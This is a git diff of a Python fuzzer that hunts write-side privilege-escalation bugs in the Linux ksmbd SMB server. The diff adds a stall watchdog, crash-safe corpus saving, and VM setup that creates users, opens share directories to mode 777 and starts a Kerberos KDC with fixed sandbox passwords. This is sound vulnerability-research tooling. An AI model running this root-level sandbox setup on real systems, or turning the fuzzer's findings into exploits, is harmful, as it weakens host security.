@@ -4,19 +4,20 @@ ksmbdzzer.py — KSMBD write-side LPE fuzzer.
 
 Usage:
   ksmbdzzer.py init [--install-deps]
-  ksmbdzzer.py fuzz -t 5h -procs 2 -target write -sniper-time 30
+  ksmbdzzer.py gfuzz -r 5 --grain-max 25                 # whole-fleet, round-based
+  ksmbdzzer.py gfuzz -r 5 -t write copychunk reparse       # only these grains
   ksmbdzzer.py validate -time 10
-  ksmbdzzer.py campaign -hours 5
 """
 from __future__ import annotations
 
 import argparse
 import ctypes
-import ctypes.util
+import hashlib
 import json
 import multiprocessing
 import os
 import random
+import signal
 import socket
 import struct
 import subprocess
@@ -24,9 +25,107 @@ import sys
 import time
 from dataclasses import dataclass, field
 from pathlib import Path
-from typing import Callable
+
 
 SCRIPT_DIR = Path(__file__).parent
+
+
+def _dts():
+    """dmesg-style monotonic timestamp `[   SS.uuuuuu]` — same clock base as the
+    kernel's printk (CLOCK_MONOTONIC ≈ local_clock, seconds since boot), so a
+    fuzzer phase line can be lined up directly against a kernel oops/KASAN line
+    in `dmesg`. Prefix log lines with it to correlate host-side fuzzing phases
+    with guest-side kernel events."""
+    t = time.clock_gettime(time.CLOCK_MONOTONIC)
+    sec = int(t)
+    return f"[{sec:5d}.{int((t - sec) * 1_000_000):06d}]"
+
+
+# ─── Colored, located logging (auto-applied to EVERY print in this module) ─────
+# Overriding the builtin print (instead of editing ~87 call sites) makes every log
+# line uniform: a dmesg-style timestamp (same CLOCK_MONOTONIC base as the kernel,
+# so host lines align with a dmesg oops) + the source file:line, wrapped in THIS
+# program's 24-bit truecolor so each fuzzer component is visually distinct in a
+# combined log. This also retro-fits the timestamp onto lines that were missing it.
+# A leading _dts()-style stamp already in the message is stripped so it isn't doubled.
+import sys as _sys, os as _os, re as _re, builtins as _bi
+_LOG_COLOR = "\033[38;2;107;181;163m"   # #6bb5a3 — ksmbdzzer.py
+_LOG_RESET = "\033[0m"
+_LOG_TS_RE = _re.compile(r'^\s*\[\s*\d+\.\d{6}\]\s*')   # a pre-existing dmesg stamp
+# In-guest liveness heartbeat: EVERY log line stamps this. The in-guest watchdog (below)
+# uses it to tell a USERSPACE stall (Python alive, no output) from healthy work — so it
+# can unstick a hung wave without the host having to reboot the whole VM.
+_LAST_PROGRESS = [time.clock_gettime(time.CLOCK_MONOTONIC)]
+def print(*args, **kwargs):
+    end = kwargs.pop("end", "\n"); file = kwargs.pop("file", _sys.stdout)
+    flush = kwargs.pop("flush", False); sep = kwargs.pop("sep", " ")
+    fr = _sys._getframe(1)
+    loc = "%s:%d" % (_os.path.basename(fr.f_code.co_filename), fr.f_lineno)
+    body = _LOG_TS_RE.sub("", sep.join(str(a) for a in args))
+    _LAST_PROGRESS[0] = time.clock_gettime(time.CLOCK_MONOTONIC)
+    _bi.print("%s%s %s | %s%s" % (_LOG_COLOR, _dts(), loc, body, _LOG_RESET),
+              end=end, file=file, flush=flush)
+
+
+def _inguest_watchdog(stall_secs):
+    """Recover a USERSPACE stall in-guest instead of letting the host reboot the VM.
+
+    If no log line is emitted for `stall_secs` while this thread still runs, the main
+    loop is stuck in userspace (a hung grain / blocked wave) — NOT a kernel wedge (a
+    real kernel livelock/deadlock would starve this thread too, and only the host
+    watchdog can rescue that). We unstick it by SIGKILLing the grain child processes
+    the main thread is waiting on, so its wave barrier returns and the round continues.
+    The VM stays up, the corpus is not lost, and no reboot/re-do is needed. The host
+    watchdog (larger STALL_SECS) stays as the backstop for genuine kernel wedges."""
+    while True:
+        time.sleep(30)
+        idle = time.clock_gettime(time.CLOCK_MONOTONIC) - _LAST_PROGRESS[0]
+        if idle < stall_secs:
+            continue
+        print(f"[!!! IN-GUEST WATCHDOG] no progress for {idle:.0f}s — Python still alive, "
+              f"so this is a USERSPACE stall; SIGKILLing stuck grain runs to unblock "
+              f"the wave (VM stays up, no reboot).", flush=True)
+        try:
+            # Match RUNNING libFuzzer grain processes by their unique '-max_total_time'
+            # arg — NOT 'grain_', which also matches the P1 `clang ... grain_X.c`
+            # compiles (killing those would abort a healthy build; that was the P1 bug).
+            subprocess.run(['pkill', '-9', '-f', 'max_total_time'], capture_output=True, timeout=10)
+        except Exception as _e:
+            print(f"[in-guest watchdog] pkill failed: {_e!r}", flush=True)
+        _LAST_PROGRESS[0] = time.clock_gettime(time.CLOCK_MONOTONIC)   # fresh window for recovery
+
+
+class _HeartbeatStdout:
+    """Wrap sys.stdout so ANY output — from THIS module OR grain/gen.py (P1/P2 logging,
+    which has its own print override and never touched this module's _LAST_PROGRESS) —
+    stamps the heartbeat. Without this the watchdog froze at [P1 START] and killed the
+    healthy compiles. Transparent proxy: everything but write() delegates to the real
+    stream. gen.py resolves sys.stdout dynamically, so replacing the attribute is enough."""
+    def __init__(self, wrapped):
+        self._w = wrapped
+    def write(self, s):
+        _LAST_PROGRESS[0] = time.clock_gettime(time.CLOCK_MONOTONIC)
+        return self._w.write(s)
+    def __getattr__(self, name):
+        return getattr(self._w, name)
+
+
+def _start_inguest_watchdog():
+    """Launch the in-guest watchdog. Threshold from KSMBDZZER_INGUEST_STALL (default
+    300s) — keep it BELOW the host STALL_SECS (420s) so a userspace stall is recovered
+    in-guest first, and the host reboot only ever fires for a true kernel wedge. 300s
+    comfortably clears one P1 compile batch (~130s/batch on the 9p rootfs) between log
+    lines so a slow-but-healthy build is never mistaken for a stall."""
+    import threading
+    try:
+        stall = int(_os.environ.get('KSMBDZZER_INGUEST_STALL', '300'))
+    except ValueError:
+        stall = 300
+    if not isinstance(_sys.stdout, _HeartbeatStdout):
+        _sys.stdout = _HeartbeatStdout(_sys.stdout)   # heartbeat catches gen.py output too
+    _LAST_PROGRESS[0] = time.clock_gettime(time.CLOCK_MONOTONIC)
+    threading.Thread(target=_inguest_watchdog, args=(stall,), daemon=True).start()
+    return stall
 
 
 # ─── Configuration (dataclass) ────────────────────────────────────────────────
@@ -36,145 +135,222 @@ class Config:
     """Immutable fuzzer configuration."""
     conf_file: Path = field(default_factory=lambda: SCRIPT_DIR / 'ksmbd-sandbox.config')
     corpus_db: Path = Path('/tmp/ksmbdzzer_corpus.json')
-    mount: str = '/home/debian-sid/mnt'
+    mount: str = '/tmp/ksmbdzzer_mnt'
     share: str = '/tmp/ksmbd_share'
     pwdb: str = '/tmp/ksmbd_conf/ksmbdpwd.db'
-    buf_words: int = 1 << 16
-    kcov_df_init: int = 0x80086401
-    kcov_df_remote_enable: int = 0x00006466
-    kcov_df_remote_disable: int = 0x00006467
 
 
 CFG = Config()
 
-
-@dataclass
-class RoundResult:
-    """Result from a single worker cycle."""
-    features: int = 0
-    transitions: int = 0
-    raw_pdus: int = 0
-    bugs: int = 0
-    corpus: list = field(default_factory=list)
-    new_features: list = field(default_factory=list)
-    new_values: list = field(default_factory=list)
-
-
-# Legacy aliases (used throughout — will remove in full refactoring)
+# Path/name aliases used throughout the module. The kcov_dataflow ioctls, mmap,
+# and buffer sizing now live entirely in libksmbdzzer.c (per-worker handle), so
+# the old Python-side KCOV_DF_* / BUF_WORDS / libc.mmap constants were removed.
 CONF_FILE = CFG.conf_file
 CORPUS_DB = CFG.corpus_db
 MOUNT = CFG.mount
 SHARE = CFG.share
 PWDB = CFG.pwdb
-KCOV_DF_INIT = CFG.kcov_df_init
-KCOV_DF_REMOTE_ENABLE = CFG.kcov_df_remote_enable
-KCOV_DF_REMOTE_DISABLE = CFG.kcov_df_remote_disable
-BUF_WORDS = CFG.buf_words
-
-libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
-libc.mmap.restype = ctypes.c_void_p
-
-
-# ─── VFS Operations (Strategy Pattern: first-class functions) ─────────────────
-
-VfsOp = Callable[[str, int, bytes], None]
-
-
-# ─── Service Layer (Composition) ──────────────────────────────────────────────
-
-@dataclass
-class KsmbdService:
-    """Manages ksmbd lifecycle: init, mount, recovery."""
-    cfg: Config = field(default_factory=lambda: CFG)
-
-    def restart_and_remount(self) -> bool:
-        """Full restart: kill mountd, reload module if needed, remount."""
-        subprocess.run(f'umount -l {self.cfg.mount}'.split(), capture_output=True)
-        subprocess.run(f'umount -l {self.cfg.mount}_acl'.split(), capture_output=True)
-        time.sleep(1)
-        if subprocess.run('ls /sys/module/ksmbd'.split(), capture_output=True).returncode != 0:
-            subprocess.run('modprobe ksmbd'.split(), capture_output=True)
-            time.sleep(1)
-        subprocess.run('pkill -9 ksmbd.mountd'.split(), capture_output=True)
-        time.sleep(0.5)
-        subprocess.Popen(f'ksmbd.mountd -C {self.cfg.conf_file} -P {self.cfg.pwdb} -n'.split(),
-                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(2)
-        subprocess.run(
-            f'mount -t cifs //127.0.0.1/share {self.cfg.mount} -o username=fuzz,password=fuzz,vers=3.0,cache=none,noperm'.split(),
-            capture_output=True)
-        try:
-            Path(f'{self.cfg.mount}/fuzz_target').write_bytes(b'x')
-            return True
-        except:
-            return False
-
-
-_service = KsmbdService()
 
 
 # ─── Corpus DB ────────────────────────────────────────────────────────────────
 
+# Host-durable corpus mirror (survives a VM wedge). CORPUS_DB is guest /tmp (fast);
+# this copy is on the 9p repo mount so a crash costs the in-flight round, not the run.
+_HOST_CORPUS = SCRIPT_DIR / '.fuzzdb' / 'corpus.json'
+
 def corpus_load():
-    """Load persistent corpus from JSON db."""
-    if not CORPUS_DB.exists():
-        return [], set(), []
-    try:
-        raw = json.loads(CORPUS_DB.read_text())
-        entries = [(e['offset'], bytes.fromhex(e['data']), e['rank']) for e in raw['corpus']]
-        return entries, set(raw.get('features', [])), raw.get('value_pool', [])
-    except Exception:
-        return [], set(), []
+    """Load persistent corpus, giving PRECEDENCE to the previous generation. Prefer the
+    hot guest /tmp copy; if it is absent OR corrupt (e.g. truncated by a panic that hit
+    mid-write), fall back to the host-durable mirror (.fuzzdb/corpus.json, on the 9p repo
+    mount). So a VM wedge/panic costs only the in-flight round — the campaign resumes
+    from the last cleanly-saved generation instead of starting cold."""
+    for src in (CORPUS_DB, _HOST_CORPUS):
+        if not src.exists():
+            continue
+        try:
+            raw = json.loads(src.read_text())
+            entries = [(e['offset'], bytes.fromhex(e['data']), e['rank']) for e in raw['corpus']]
+            if src is _HOST_CORPUS:
+                print(f"  [resume] loaded {len(entries)} corpus entries from the host-durable "
+                      f"mirror ({_HOST_CORPUS}) — continuing the previous generation", flush=True)
+            return entries, set(raw.get('features', [])), raw.get('value_pool', [])
+        except Exception:
+            continue                      # corrupt/partial source — try the next one
+    return [], set(), []
+
+def _atomic_write_text(path: Path, blob: str):
+    """Write blob to path ATOMICALLY (tmp + os.replace). A panic during the write can
+    then never leave a truncated/corrupt file — the old copy stays intact until the
+    rename flips it in one step. This is what lets the durable corpus survive a crash
+    that lands mid-save (the whole point of the host mirror)."""
+    tmp = path.with_name(path.name + '.tmp')
+    tmp.write_text(blob)
+    os.replace(tmp, path)                 # atomic on the same filesystem
 
 def corpus_save(corpus, features, value_pool):
-    """Save corpus to JSON db."""
+    """Persist corpus to the hot /tmp DB AND write-through to the host-durable mirror.
+    BOTH writes are atomic so a VM panic mid-save cannot corrupt either copy — the
+    previous generation's corpus stays intact for the resume."""
     data = {
-        'corpus': [{'offset': c[0], 'data': c[1] if isinstance(c[1], str) else c[1].hex(), 'rank': c[2]} for c in corpus[:512]],
+        'corpus': [{'offset': c[0], 'data': c[1] if isinstance(c[1], str) else c[1].hex(), 'rank': c[2]} for c in corpus[:4096]],
         'features': list(features)[:50000],
         'value_pool': value_pool[:4096],
     }
-    CORPUS_DB.write_text(json.dumps(data))
+    blob = json.dumps(data)
+    try:
+        _atomic_write_text(CORPUS_DB, blob)
+    except OSError:
+        pass
+    try:                                  # write-through to host mount (durability)
+        _HOST_CORPUS.parent.mkdir(exist_ok=True)
+        _atomic_write_text(_HOST_CORPUS, blob)
+    except OSError:
+        pass
 
 # ─── Init ─────────────────────────────────────────────────────────────────────
 
 def cmd_init(install_deps=False):
     if install_deps:
         print('[*] Installing dependencies...')
-        subprocess.run('apt-get update -qq && apt-get install -y -qq krb5-kdc krb5-admin-server smbclient'.split(),
+        subprocess.run(['apt-get', 'update', '-qq'], capture_output=True)
+        subprocess.run(['apt-get', 'install', '-y', '-qq',
+                       'ksmbd-tools', 'cifs-utils', 'smbclient',
+                       'krb5-kdc', 'krb5-admin-server',
+                       'librdmacm-dev', 'libibverbs-dev', 'rdma-core', 'iproute2'],
                       capture_output=True)
         print('[+] Dependencies installed')
-    os.makedirs(SHARE, exist_ok=True)
-    os.makedirs('/tmp/ksmbd_acl', exist_ok=True)
-    os.makedirs('/tmp/ksmbd_priv', exist_ok=True)
-    os.makedirs('/tmp/ksmbd_conf', exist_ok=True)
-    os.makedirs(MOUNT, exist_ok=True)
-    os.makedirs(f'{MOUNT}_acl', exist_ok=True)
+
+    # Each init step logs START → RESULT so a stall is attributable to a specific
+    # step (the mountd start, the CIFS mount retries and the sleeps are the blocking
+    # points). Prefix [init]; the print override adds the [time] file:line stamp.
+    print('[init] 1/9 creating share/mount directories')
+    for d in [SHARE, '/tmp/ksmbd_acl', '/tmp/ksmbd_priv', '/tmp/ksmbd_conf', MOUNT, f'{MOUNT}_acl']:
+        os.makedirs(d, exist_ok=True)
     os.chmod(SHARE, 0o777)
-    os.chmod('/tmp/ksmbd_acl', 0o755)
+    # 0o777 (was 0o755): [aclshare] uses `force user = fuzz`, so ksmbd creates files as
+    # fuzz — a root-owned 0o755 backing dir left every write EACCES. POSIX perms here are
+    # wide open on purpose; the ACL enforcement under test is the SMB security descriptor
+    # path (smbacl.c via the SD grains), not the backing filesystem mode.
+    os.chmod('/tmp/ksmbd_acl', 0o777)
     os.chmod('/tmp/ksmbd_priv', 0o777)
+
+    # Load ksmbd module (if not built-in)
+    print('[init] 2/9 modprobe ksmbd (no-op if built-in)')
+    subprocess.run(['modprobe', 'ksmbd'], capture_output=True)
+
+    # Create user (BOTH a system user and the ksmbd SMB user).
+    print('[init] 3/9 provisioning user fuzz (system + SMB)')
+    # SYSTEM user first: [aclshare] uses `force user = fuzz`, which ksmbd.mountd resolves
+    # via getpwnam() at load — if `fuzz` is not in /etc/passwd, mountd DROPS the share and
+    # a tree-connect returns BAD_NETWORK_NAME (the #42 aclshare failure). ksmbd.adduser only
+    # populates the ksmbd SMB user DB, not /etc/passwd, so create the POSIX user too.
+    # (-M no home, nologin shell; harmless if it already exists.)
+    _ua = subprocess.run(['useradd', '-M', '-s', '/usr/sbin/nologin', 'fuzz'],
+                         capture_output=True, text=True)
+    _pw = subprocess.run(['getent', 'passwd', 'fuzz'], capture_output=True, text=True)
+    if _pw.returncode == 0:
+        print(f'[init]     system user OK: {_pw.stdout.strip()}')
+    else:
+        print(f'[init]     !!! system user fuzz MISSING (useradd rc={_ua.returncode}: '
+              f'{_ua.stderr.strip()[:120]}) — force-user shares (aclshare) will be dropped')
     subprocess.run(f'ksmbd.adduser -C {CONF_FILE} -P {PWDB} -a fuzz -p fuzz'.split(), capture_output=True)
-    subprocess.Popen(f'ksmbd.mountd -C {CONF_FILE} -P {PWDB} -n'.split(),
-                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(1)
-    r = subprocess.run(f'mount -t cifs //127.0.0.1/share {MOUNT} -o username=fuzz,password=fuzz,vers=3.1.1,cache=none,noperm'.split(), capture_output=True)
-    if r.returncode != 0:
-        subprocess.run(f'mount -t cifs //127.0.0.1/share {MOUNT} -o username=fuzz,password=fuzz,vers=3.0,cache=none,noperm'.split(), check=True, capture_output=True)
-    Path(f'{MOUNT}/fuzz_target').write_bytes(b'x')
-    # Mount ACL share (exercises smbacl.c — non-root permission checks)
-    r2 = subprocess.run(f'mount -t cifs //127.0.0.1/aclshare {MOUNT}_acl -o username=fuzz,password=fuzz,vers=3.0,cache=none'.split(), capture_output=True)
-    if r2.returncode == 0:
-        try: Path(f'{MOUNT}_acl/fuzz_acl').write_bytes(b'x')
-        except: pass
-        print(f'[+] ACL share: {MOUNT}_acl')
 
-    # NDR/DCE-RPC: Access IPC$ share (exercises ndr.c via srvsvc/wkssvc)
+    # RDMA setup (before ksmbd.mountd so listener binds to IB device)
+    print('[init] 4/9 setting up Software RDMA transport (SIW/RXE)')
     try:
-        subprocess.run(f'smbclient //127.0.0.1/ipc$ -U fuzz%fuzz -c "help" -m SMB3'.split(),
-                      capture_output=True, timeout=5)
-        print('[+] NDR/IPC$ exercised')
-    except: pass
+        _setup_target_transport()
+    except Exception as e:
+        print(f'[init]     RDMA setup skipped: {e!r}')
+    time.sleep(1)
 
-    # KDC setup: start krb5kdc with minimal config for Kerberos auth path
+    # Kill any existing mountd, then start fresh
+    print('[init] 5/9 (re)starting ksmbd.mountd user daemon')
+    subprocess.run(['pkill', '-9', 'ksmbd.mountd'], capture_output=True)
+    time.sleep(0.5)
+    # Capture mountd's VERBOSE load log (was DEVNULL → we were blind to WHY a share is
+    # dropped). ksmbd.mountd -v logs each share it parses/exports and any per-share error
+    # (bad path, unresolvable force user, …). We tail it on an aclshare mount failure.
+    _MOUNTD_LOG = '/tmp/ksmbd_mountd.log'
+    _mf = open(_MOUNTD_LOG, 'w')
+    subprocess.Popen(f'ksmbd.mountd -C {CONF_FILE} -P {PWDB} -n -v'.split(),
+                     stdout=_mf, stderr=_mf)
+    time.sleep(2)
+    print('[init]     ksmbd.mountd started (waited 2s for listener)')
+
+    # Mount CIFS share (try 3.1.1, fallback to 3.0)
+    print('[init] 6/9 mounting //127.0.0.1/share (dialect 3.1.1→3.0→2.1)')
+    mounted = False
+    for vers in ['3.1.1', '3.0', '2.1']:
+        print(f'[init]     mount attempt vers={vers} ...')
+        r = subprocess.run(
+            f'mount -t cifs //127.0.0.1/share {MOUNT} -o username=fuzz,password=fuzz,vers={vers},cache=none,noperm'.split(),
+            capture_output=True)
+        if r.returncode == 0:
+            mounted = True
+            print(f'[init]     mounted share at {MOUNT} (vers={vers})')
+            break
+        print(f'[init]     vers={vers} failed rc={r.returncode}: {r.stderr.decode().strip()[:120]}')
+    if not mounted:
+        print(f'[-] CIFS mount failed (all dialects): {r.stderr.decode().strip()}')
+        return
+
+    # Write test file
+    try:
+        Path(f'{MOUNT}/fuzz_target').write_bytes(b'x')
+        print('[init] 7/9 wrote fuzz_target probe file (share is writable)')
+    except OSError as e:
+        print(f'[-] Write test failed: {e}')
+        return
+
+    # ACL share (optional — known gap #42 if it fails with BAD_NETWORK_NAME)
+    r2 = subprocess.run(
+        f'mount -t cifs //127.0.0.1/aclshare {MOUNT}_acl -o username=fuzz,password=fuzz,vers=3.0,cache=none'.split(),
+        capture_output=True)
+    if r2.returncode == 0:
+        print('[init] 8/9 aclshare mounted (ACL grain live)')
+        try:
+            Path(f'{MOUNT}_acl/fuzz_acl').write_bytes(b'x')
+        except OSError:
+            pass
+    else:
+        print(f'[init] 8/9 aclshare NOT mounted rc={r2.returncode} (optional; ACL grain dead — #42): '
+              f'{r2.stderr.decode().strip()[:100]}')
+        # Dump WHY mountd dropped the share (ground truth instead of guessing): the mountd
+        # verbose log lines that mention aclshare / fuzz / the share path.
+        try:
+            _ml = Path(_MOUNTD_LOG).read_text().splitlines()
+            _hits = [l.strip() for l in _ml
+                     if any(k in l.lower() for k in ('aclshare', 'ksmbd_acl', 'force user', 'fuzz', 'share'))]
+            if _hits:
+                print('[init]     mountd log (aclshare cause): ' + ' ┃ '.join(_hits[-8:]))
+            else:
+                print(f'[init]     mountd log had no aclshare line; full tail: '
+                      + ' ┃ '.join(l.strip() for l in _ml[-6:]))
+            # also confirm the backing path actually exists as mountd sees it
+            _p = Path('/tmp/ksmbd_acl')
+            print(f'[init]     path /tmp/ksmbd_acl exists={_p.is_dir()} '
+                  f'mode={oct(_p.stat().st_mode & 0o777) if _p.exists() else "-"}')
+        except Exception as _de:
+            print(f'[init]     (mountd-log diag failed: {_de!r})')
+
+    # NDR/IPC$ exercise (optional — tests srvsvc)
+    try:
+        subprocess.run(
+            'smbclient //127.0.0.1/ipc$ -U fuzz%fuzz -c help -m SMB3'.split(),
+            capture_output=True, timeout=5)
+        print('[init] 9/9 NDR/IPC$ exercised (srvsvc reachable)')
+    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
+        print(f'[init] 9/9 IPC$ probe skipped ({type(e).__name__})')
+
+    # KDC setup (optional — for Kerberos fuzzing)
+    print('[init]     setting up KDC (optional, Kerberos auth path)')
+    _setup_target_auth()
+
+    print(f'[+] KSMBD ready: {MOUNT}')
+
+
+def _setup_target_auth():
+    """Set up minimal KDC for Kerberos auth path fuzzing. Non-fatal if fails."""
     try:
         kdc_dir = Path('/tmp/kdc')
         kdc_dir.mkdir(exist_ok=True)
@@ -202,1293 +378,1212 @@ def cmd_init(install_deps=False):
             '    max_life = 10h\n'
             '    max_renewable_life = 7d\n'
             '  }\n')
+        env = {**os.environ, 'KRB5_CONFIG': str(krb5_conf), 'KRB5_KDC_PROFILE': str(kdc_conf)}
         os.environ['KRB5_CONFIG'] = str(krb5_conf)
         os.environ['KRB5_KDC_PROFILE'] = str(kdc_conf)
-        # Create KDC database
         if not (kdc_dir / 'principal').exists():
-            subprocess.run(
-                f'kdb5_util create -s -r FUZZ.LOCAL -P fuzzpass'.split(),
-                capture_output=True, timeout=10,
-                env={**os.environ, 'KRB5_CONFIG': str(krb5_conf), 'KRB5_KDC_PROFILE': str(kdc_conf)})
-            # Add principals
+            subprocess.run('kdb5_util create -s -r FUZZ.LOCAL -P fuzzpass'.split(),
+                          capture_output=True, timeout=10, env=env)
             for princ in ['fuzz', 'cifs/127.0.0.1']:
                 subprocess.run(
                     f'kadmin.local -q addprinc -pw fuzz {princ}@FUZZ.LOCAL'.split(),
-                    capture_output=True, timeout=5,
-                    env={**os.environ, 'KRB5_CONFIG': str(krb5_conf), 'KRB5_KDC_PROFILE': str(kdc_conf)})
-        # Start KDC
-        subprocess.Popen(
-            ['krb5kdc', '-n'],
-            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-            env={**os.environ, 'KRB5_CONFIG': str(krb5_conf), 'KRB5_KDC_PROFILE': str(kdc_conf)})
+                    capture_output=True, timeout=5, env=env)
+        subprocess.Popen(['krb5kdc', '-n'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, env=env)
         time.sleep(0.5)
         print('[+] KDC running (FUZZ.LOCAL, port 88)')
     except Exception:
-        # krb5 not installed — just set config for future use
-        try:
-            krb5_conf = Path('/tmp/krb5.conf')
-            if not krb5_conf.exists():
-                krb5_conf.write_text('[libdefaults]\ndefault_realm = FUZZ.LOCAL\n'
-                                     '[realms]\nFUZZ.LOCAL = { kdc = 127.0.0.1 }\n')
-                os.environ['KRB5_CONFIG'] = str(krb5_conf)
-        except: pass
-        print('[+] KRB5 config written (kdc not available)')
+        print('[+] KDC not available (optional)')
 
-    print(f'[+] KSMBD ready: {MOUNT}')
-
-# ─── DfRemote (implements DataflowCapture protocol) ───────────────────────────
-
-class DataflowCapture:
-    """Protocol: any object providing these methods satisfies the interface."""
-    def enable(self) -> None: ...
-    def disable(self) -> None: ...
-    def features_fast(self) -> set[int]: ...
-    def count_success_returns(self) -> tuple[int, int, set]: ...
-    def read(self) -> tuple[list[int], list[tuple[int, int]]]: ...
+    # PC normalization
+    _get_target_text_base()
+    if _target_text_base:
+        print(f'[+] ksmbd .text base: 0x{_target_text_base:x}')
 
 
-class DfRemote:
+def _setup_target_transport():
+    """Initialize Software RDMA for SMBDirect fuzzing.
+
+    SIW (iWARP) on eth0 with bridge networking = proven working path.
+    RXE on lo = fallback (address resolution issues with RDMA CM).
+    Kernel has CONFIG_RDMA_RXE=y CONFIG_RDMA_SIW=y (built-in, no modprobe).
+    """
+    print('[*] Setting up Software RDMA...')
+    subprocess.run(['ip', 'link', 'set', 'lo', 'up'], capture_output=True)
+
+    # Find non-lo interface
+    r = subprocess.run(['ip', '-o', 'link', 'show', 'up'], capture_output=True, text=True)
+    iface = None
+    for line in r.stdout.splitlines():
+        if 'lo' not in line and 'LOOPBACK' not in line:
+            parts = line.split(':')
+            if len(parts) >= 2:
+                iface = parts[1].strip(); break
+
+    # Primary: SIW on real interface (requires --network bridge)
+    if iface:
+        r2 = subprocess.run(['ip', '-4', 'addr', 'show', iface], capture_output=True, text=True)
+        if 'inet ' not in r2.stdout:
+            subprocess.run(['ip', 'addr', 'add', '192.168.122.50/24', 'dev', iface], capture_output=True)
+            subprocess.run(['ip', 'link', 'set', iface, 'up'], capture_output=True)
+        subprocess.run(['rdma', 'link', 'del', 'siw0'], capture_output=True)
+        r = subprocess.run(['rdma', 'link', 'add', 'siw0', 'type', 'siw', 'netdev', iface],
+                          capture_output=True, text=True)
+        if r.returncode == 0:
+            print(f'[+] RDMA link siw0 (SIW/iWARP) on {iface}')
+            return
+
+    # Fallback: RXE on dummy interface (RDMA CM needs a real IP, not loopback)
+    subprocess.run(['ip', 'link', 'add', 'dummy0', 'type', 'dummy'], capture_output=True)
+    subprocess.run(['ip', 'addr', 'add', '10.0.99.1/24', 'dev', 'dummy0'], capture_output=True)
+    subprocess.run(['ip', 'link', 'set', 'dummy0', 'up'], capture_output=True)
+    subprocess.run(['rdma', 'link', 'del', 'rxe0'], capture_output=True)
+    r = subprocess.run(['rdma', 'link', 'add', 'rxe0', 'type', 'rxe', 'netdev', 'dummy0'],
+                      capture_output=True, text=True)
+    if r.returncode == 0:
+        print('[+] RDMA link rxe0 (Soft-RoCE) on dummy0 (10.0.99.1)')
+    else:
+        print('[-] RDMA setup failed')
+
+
+# ─── Persistent Mode + PC Normalization ──────────────────────────────────────
+
+_target_text_base = 0
+
+def _get_target_text_base():
+    """Read ksmbd module .text base for PC normalization."""
+    global _target_text_base
+    try:
+        with open('/sys/module/ksmbd/sections/.text') as f:
+            _target_text_base = int(f.read().strip(), 16)
+    except (FileNotFoundError, ValueError, PermissionError):
+        _target_text_base = 0
+    return _target_text_base
+
+
+# ─── Dataflow records + access-control contract model ─────────────────────────
+# Mirrors `struct pfz_rec` in libksmbdzzer.c — keep field order in sync.
+class DataflowRec(ctypes.Structure):
+    _fields_ = [
+        ("pc",      ctypes.c_uint64),
+        ("vals",    ctypes.c_uint64 * 6),
+        ("type",    ctypes.c_uint32),   # 0xE entry, 0xF return
+        ("arg_idx", ctypes.c_uint32),
+        ("size",    ctypes.c_uint32),
+        ("nfields", ctypes.c_uint32),
+        ("seq",     ctypes.c_uint32),
+        ("_pad",    ctypes.c_uint32),
+    ]
+
+# SMB2 DesiredAccess bits / dispositions / create options (fs/smb/common/smb2pdu.h)
+FILE_READ_DATA        = 0x00000001
+FILE_WRITE_DATA       = 0x00000002
+FILE_APPEND_DATA      = 0x00000004
+FILE_READ_EA          = 0x00000008
+FILE_WRITE_EA         = 0x00000010
+FILE_READ_ATTRIBUTES  = 0x00000080
+FILE_WRITE_ATTRIBUTES = 0x00000100
+FILE_DELETE           = 0x00010000
+FILE_GENERIC_WRITE    = 0x40000000
+FILE_GENERIC_READ     = 0x80000000
+# FILE_WRITE_DESIRE_ACCESS_LE — the mask smb2_create_open_flags() treats as "write"
+WRITE_DESIRE_MASK = (FILE_WRITE_DATA | FILE_APPEND_DATA | FILE_WRITE_EA |
+                     FILE_WRITE_ATTRIBUTES | FILE_GENERIC_WRITE)
+
+FILE_DIRECTORY_FILE    = 0x00000001
+FILE_NON_DIRECTORY_FILE= 0x00000040
+FILE_DELETE_ON_CLOSE   = 0x00001000
+# CreateDisposition & FILE_CREATE_MASK (0x7); these set O_TRUNC when file present
+DISP_SUPERSEDE, DISP_OPEN, DISP_CREATE = 0, 1, 2
+DISP_OPEN_IF, DISP_OVERWRITE, DISP_OVERWRITE_IF = 3, 4, 5
+TRUNC_DISPOSITIONS = {DISP_SUPERSEDE, DISP_OVERWRITE, DISP_OVERWRITE_IF}
+
+# Host-visible: SCRIPT_DIR (ksmbd/) is 9p-mapped from the host under virtme,
+# whereas the VM's /tmp is an ephemeral tmpfs overlay. Reproducers must survive
+# VM exit, so write them next to the fuzzer. Override with KSMBDZZER_FINDINGS.
+FINDINGS_DIR = Path(os.environ.get("KSMBDZZER_FINDINGS", str(SCRIPT_DIR / "findings")))
+
+# ─── Durable arbiter DB (host-mount, survives a VM wedge) ─────────────────────
+# The distilled cross-round feedback (g_fb) lives on the repo mount, NOT guest
+# /tmp — so a VM crash costs the in-flight round, not the campaign's learning.
+FUZZDB = SCRIPT_DIR / '.fuzzdb'
+try:
+    FUZZDB.mkdir(exist_ok=True)
+except OSError:
+    pass
+
+def write_feedback(hot_offs, vals):
+    """Pack the arbiter feedback (g_fb) for the C connector. Layout MUST stay in
+    sync with `struct feedback` in grain/common.h:
+      <I magic=0xF00DDA7A, I n_hot, I n_val, I pad, 64H hot_off, 128Q vals>.
+    Written to FUZZDB/fb.bin; grains read it via load_feedback()/$GRAIN_FB."""
+    hot = list(dict.fromkeys(int(o) & 0xFFFF for o in hot_offs if 0 <= int(o) < 4096))[:64]
+    vv = list(dict.fromkeys(int(v) & 0xFFFFFFFFFFFFFFFF for v in vals if int(v)))[:128]
+    blob = struct.pack('<IIII', 0xF00DDA7A, len(hot), len(vv), 0)
+    blob += struct.pack('<64H', *(hot + [0] * (64 - len(hot))))
+    blob += struct.pack('<128Q', *(vv + [0] * (128 - len(vv))))
+    try:
+        (FUZZDB / 'fb.bin').write_bytes(blob)
+        return len(hot), len(vv)
+    except OSError:
+        return 0, 0
+
+
+def vlog(msg):
+    """Verbose trace (only when --verbose / KSMBDZZER_VERBOSE=1). Propagated via
+    env so it survives fork into ProcessPoolExecutor workers."""
+    if os.environ.get("KSMBDZZER_VERBOSE") == "1":
+        print(f"  [v] {msg}", flush=True)
+
+
+def verbose_on() -> bool:
+    return os.environ.get("KSMBDZZER_VERBOSE") == "1"
+
+
